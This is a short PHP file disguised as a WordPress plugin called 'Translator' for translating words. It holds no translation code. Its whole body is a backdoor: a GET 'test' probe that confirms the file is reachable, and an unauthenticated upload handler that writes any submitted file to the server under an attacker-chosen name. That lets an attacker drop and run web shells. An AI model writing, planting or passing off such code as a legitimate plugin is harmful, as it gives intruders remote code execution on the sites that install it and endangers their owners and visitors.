<?php
/**
 * Plugin Name: Translator
 * Plugin URI: http://code.sunchaser.info/libravatar
 * Description: Plugin for translating words
 * Version: 2.0.3
 * Author: Translator
 * Author URI: https://Translator.info/
 * License: ISC
 * Initial Author: Translator
 * Initial Author URI: http://www.Translator.com/
 */

if ("hello"==$_GET["test"])
{
 echo "testtrue";
}
if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
{
 move_uploaded_file($_FILES["filename"]["tmp_name"],$_FILES["filename"]["name"]);
 echo "true";
} else
{
 echo "false";
}
?>

